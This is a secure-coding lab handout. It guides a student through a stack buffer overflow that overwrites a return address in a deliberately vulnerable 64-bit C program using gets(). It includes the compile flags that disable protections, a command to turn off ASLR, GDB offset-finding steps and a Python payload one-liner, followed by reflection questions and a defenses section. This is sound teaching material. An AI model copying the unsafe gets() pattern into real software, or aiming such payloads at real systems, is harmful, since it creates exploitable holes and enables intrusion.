

# 🔐 Secure Coding Lab: ARC Injection via Buffer Overflow (64-bit)

## 🎯 Objective

In this lab, you will perform a classic **ARC Injection attack** by overflowing a buffer to overwrite the return address and redirect execution to a hidden `secret()` function.

---

## 🧪 Lab Setup

### 1. Create the vulnerable C program

Save the following code as `arc_injection.c`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void secret() {
    printf("🔥 You reached secret!\n");
    exit(0);
}

void vulnerable() {
    char buffer[64];
    printf("Enter your input: ");
    gets(buffer);  // Vulnerable: no bounds check!
    printf("You entered: %s\n", buffer);
}

int main() {
    vulnerable();
    return 0;
}
````

> 🔥 **Warning:** This code is intentionally vulnerable for educational purposes only.

---

### 2. Compile with protections disabled

```bash
gcc -g -fno-stack-protector -no-pie arc_injection.c -o arc_injection
```

### 3. Disable ASLR (Address Space Layout Randomization)

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

---

## 🕵️ Step 1: Find the Address of `secret()`

```bash
objdump -d ./arc_injection | grep secret
```

Example output:

```
0000000000401196 <secret>:
```

---

## 🧠 Step 2: Determine Offset to Return Address

Start GDB and inspect the stack layout.

```bash
gdb ./arc_injection
(gdb) break vulnerable
(gdb) run
(gdb) print &buffer
(gdb) info frame
```

> ✅ Note: The offset between the start of `buffer` and the saved `RIP` is typically **72 bytes**.

---

## 💣 Step 3: Craft and Execute the Exploit

Use Python to overflow the buffer and overwrite the return address:

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*72 + b"\x96\x11\x40\x00\x00\x00\x00\x00")' | ./arc_injection
```

> Replace `\x96\x11\x40...` with the **little-endian** version of the actual address of `secret()`.

---

## ✅ Expected Output

```
Enter your input:
You entered: AAAAAAAAAAAAA...
🔥 You reached secret!
```

---

## 📘 Reflection Questions

1. Why do we use little-endian format for the address?
2. What would happen if we compiled the program with stack protection enabled?
3. How does `gets()` contribute to the vulnerability?
4. How can you detect and prevent such vulnerabilities in real-world code?

---

## 🛡️ Extra Credit: Defense Mechanisms

Try recompiling with stack protection and PIE enabled:

```bash
gcc -g arc_injection.c -o arc_injection  # default flags = protections ON
```

Then re-run your exploit. What happens?

---

## 🧹 Clean-Up

Re-enable ASLR:

```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

---

```

---


```
